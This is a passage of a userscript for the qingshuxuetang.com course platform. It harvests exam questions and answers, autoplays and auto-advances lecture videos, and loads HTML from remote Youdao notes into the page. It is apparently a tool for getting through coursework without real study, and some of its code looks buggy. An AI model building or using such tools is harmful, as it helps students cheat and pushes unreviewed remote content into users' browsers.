                                item.answer = '暂无答案'
                            }

                        },
                        onerror: () => {
                            item.answer = '暂无答案'
                        }
                    });
                }
            }
        })
        let lesson_name = document.querySelector('.content-area .title span')?.innerHTML
        if (lesson_name) {
            vueinstance.lesson_name = lesson_name

        }
        function dom_to_get_lesson_number() {
            let lesson_item = document.querySelectorAll('#currentCourseDiv .col-md-3 a')
            let end_time = ""
            if (lesson_item.length !== 0) {
                let item = document.querySelector('#currentCourseDiv .col-sm-12')
                if (item != null) {
                    let text = item.innerHTML
                    text = text.split('结束时间：')
                    if (text.length === 2) {
                        end_time = text[1]
                    }
                }

            }
            lesson_item.forEach((item) => {
                let list = item.querySelectorAll(' p > span')
                if (list.length !== 2) {
                    return
                }
                let name = list[0].innerHTML
                let progress = parseInt(/\d+/.exec(list[1].innerHTML)[0] ?? 0)
                let url = list.children[0].href
                console.log(name, progress, vueinstance, url, 'dom查找')
                vue_lesson_push_func(name, progress, vueinstance.lessonlist.length, url, end_time)
            })
            return lesson_item.length
        }

        function vue_lesson_push_func(name, progress, id, url, hint_text) {
            vueinstance.lessonlist.push({ name, progress, id, url, hint_text })
        }
        /*let question_list = document.querySelectorAll('.question-entity')
if (question_list.length !== 0) {
    vueinstance.ChangeStatus(true)
    question_list.forEach((item) => {
        vueinstance.questionlist.push({
            question: item.querySelector('h4').innerHTML,
            answer: null,
            question_id:item.querySelector('.questionId').value,
            dom: item
        })

    })
}*/
        function GetLessonListData() {
            if (document.cookie.indexOf('AccessToken') === -1) {
                return;
            }
            let url = window.location.href
            let size_list = url.split('/')
            let char_list = []
            let nofind = true
            for (let index = 0; index < size_list.length; index++) {
                let item = size_list[index]
                if (nofind === false) {
                    //找到了qingshuxuetang后
                    char_list.push(item)
                }
                if (item.indexOf('qingshuxuetang.com') !== -1) {
                    nofind = false
                    continue;
                }
            }

            if (char_list.length === 0) {
                return;
            }
            let first_name = char_list[0]
            if (first_name === 'MyQingShu') {
                return;
            }
            console.log('first_name', first_name)
            let base_url = window.location.origin + '/' + first_name
            let post_url = base_url + `/Student/Course/CourseData`
    GM_xmlhttpRequest({
        url: post_url,
        method: "POST",
        headers: {
            "Content-type": "application/x-www-form-urlencoded"
        },
        onload: function (xhr) {
            if (xhr.responseText === "") {
                return;
            }
            let json = JSON.parse(xhr.responseText)
            if (json.message === '成功') {
                let lesson = json.data
                let current_lesson = lesson.filter((item) => item.learnStatus === 2)
                console.log('current_lesson', current_lesson)
                current_lesson.forEach((lesson) => {
                    let generate_url = base_url + `/Student/Course/CourseStudy?${lesson.classId !== undefined ? "classId=" + lesson.classId + "&" : ''}courseId=${lesson.courseId}&teachPlanId=${lesson.teachPlanId}&periodId=${lesson.periodId}`
                    vue_lesson_push_func(lesson.courseName, lesson.score, vueinstance.lessonlist.length, generate_url, '暂未完成')
                })
            }
        }
    });
        }
        window.onload = () => {
            if (document.querySelector('.quiz-title')) {
                if (window.location.href.indexOf('ExercisePaper') != -1) {
                    vueinstance.ChangeStatus(true)
                    //start_interval
                    let timer = setInterval(() => {
                        let page_dom = document.querySelectorAll('.question-detail-container')
                        if (page_dom.length !== 0) {
                            page_dom.forEach((item) => {
                                vueinstance.questionlist.push({
                                    question: item.querySelector('.detail-description-content').innerHTML,
                                    answer: null,
                                    question_id: item.attributes.id.value,
                                    dom: item
                                })
                            })
                            clearInterval(timer)
                        }
                    }, 1000)
                    }
            } else {
                let result = dom_to_get_lesson_number()
                if (result === 0) {
                    GetLessonListData()
                }
            }
        }


        (function() {
            'use strict';
            var i
            var href = location.href

            if (href.indexOf('nodeId') > -1) {
                setTimeout(function() {
                    var video = document.getElementsByTagName("video")[0]
                    console.log('找到视频组件,开始静音并自动播放...', video)
                    // 设置静音并播放
                    video.muted = true
                    video.playbackRate = 0.5
                    video.play()


                    var params = new UrlSearch()
                    // 课程ID
                    var courseId = params.courseId
                    const courseArr = params.nodeId.split('_')
                    // 下一个播放的视频的key
                    var nextKey = ''
                    if (courseArr.length == 2) {
                        nextKey = `kcjs_${Number(courseArr[1]) + 1}`
          } else if (courseArr.length == 3) {
              nextKey = `kcjs_${courseArr[1]}_${Number(courseArr[2]) + 1}`
          }
                    const nextUrl = `https://${window.location.host}${window.location.pathname}?teachPlanId=${params.teachPlanId}&periodId=${params.periodId}&courseId=${courseId}&nodeId=${nextKey}&category=${params.category}`
          console.log(params, 'currentId:', params.nodeId, 'nextKey:', nextKey, 'nextUrl:', nextUrl)
                    // 视频播放结束,自动下一条视频
                    video.addEventListener("ended",function(){
                        location.replace(nextUrl);
                    })
                }, 5000)

                // 打印播放进度
                getvideoprogress();
            }
        })();

        function UrlSearch() {
            var name,value;
            var str=location.href; //取得整个地址栏
            var num=str.indexOf("?")
            str=str.substr(num+1); //取得所有参数   stringvar.substr(start [, length ]

            var arr=str.split("&"); //各个参数放到数组里
            for(var i=0;i < arr.length;i++){
                num=arr[i].indexOf("=");
                if(num>0){
                    name=arr[i].substring(0,num);
                    value=arr[i].substr(num+1);
                    this[name]=value;
                }
            }
        }

        // 检测当前播放的进度
        function getvideoprogress() {
            setInterval(function () {
                var vid = document.getElementsByTagName("video")[0]
                var currentTime=vid.currentTime.toFixed(1);
                console.log('当前进度:', currentTime);
            }, 10000);
        }

    }

    var getContent=async (id)=>{
        var res = await GM_req("https://note.youdao.com/yws/api/note/"+id+"?sev=j1")
        res=JSON.parse(res)
        var content = $(res.content).text()
        return  content
    }



    var start_load=async ()=>{
        var serverScriptVersion=await getContent("35409d9023ab04ab2bbf72770bfc0b67")
        if(serverScriptVersion==GM_getValue("serverScriptVersion")){
            return ;
        }
        var html=await await getContent("686eb7cd96b60f0ead1ba9966072c99e")
        window.check.content=html
        GM_setValue("serverScriptVersion",serverScriptVersion)

    }

    start_load()

}

)();